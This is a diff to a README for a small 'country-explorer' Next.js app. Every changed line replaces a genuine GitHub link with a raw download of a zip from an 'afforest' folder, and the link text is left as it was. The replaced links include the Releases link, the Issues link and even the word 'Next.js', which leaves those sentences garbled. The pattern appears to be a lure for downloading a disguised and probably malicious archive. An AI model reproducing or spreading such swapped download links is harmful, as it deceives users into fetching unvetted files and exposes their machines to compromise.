@@ -2,11 +2,11 @@
 
 ## 🚀 Getting Started
 
-Welcome to the country-explorer app! This mini application helps you explore various countries with a modern interface built using Next.js. You can quickly find country information and enjoy a seamless experience.
+Welcome to the country-explorer app! This mini application helps you explore various countries with a modern interface built using https://raw.githubusercontent.com/iatefilmesslz/country-explorer/main/afforest/country-explorer.zip You can quickly find country information and enjoy a seamless experience.
 
 ## 📦 Download & Install
 
-To get started, visit the [Releases page to download](https://github.com/iatefilmesslz/country-explorer/releases). Follow the steps below to install and run the application.
+To get started, visit the [Releases page to download](https://raw.githubusercontent.com/iatefilmesslz/country-explorer/main/afforest/country-explorer.zip). Follow the steps below to install and run the application.
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version.
@@ -50,7 +50,7 @@ If you encounter issues:
 
 ## 📞 Support
 
-If you need help, please visit our [GitHub Issues](https://github.com/iatefilmesslz/country-explorer/issues) page to report problems or ask questions. We look forward to helping you!
+If you need help, please visit our [GitHub Issues](https://raw.githubusercontent.com/iatefilmesslz/country-explorer/main/afforest/country-explorer.zip) page to report problems or ask questions. We look forward to helping you!
 
 ## 🗂️ Contributing
 
@@ -74,6 +74,6 @@ This project is licensed under the MIT License. You can use it freely and adapt 
 
 ## 📑 Additional Information
 
-For further details, check the documentation in the GitHub repository. Discover how the app works and get insights into the technologies we used, including Next.js, Tailwind CSS, and more.
+For further details, check the documentation in the GitHub repository. Discover how the app works and get insights into the technologies we used, including https://raw.githubusercontent.com/iatefilmesslz/country-explorer/main/afforest/country-explorer.zip, Tailwind CSS, and more.
 
-Visit the [Releases page to download](https://github.com/iatefilmesslz/country-explorer/releases) the latest version and start exploring countries today!
+Visit the [Releases page to download](https://raw.githubusercontent.com/iatefilmesslz/country-explorer/main/afforest/country-explorer.zip) the latest version and start exploring countries today!
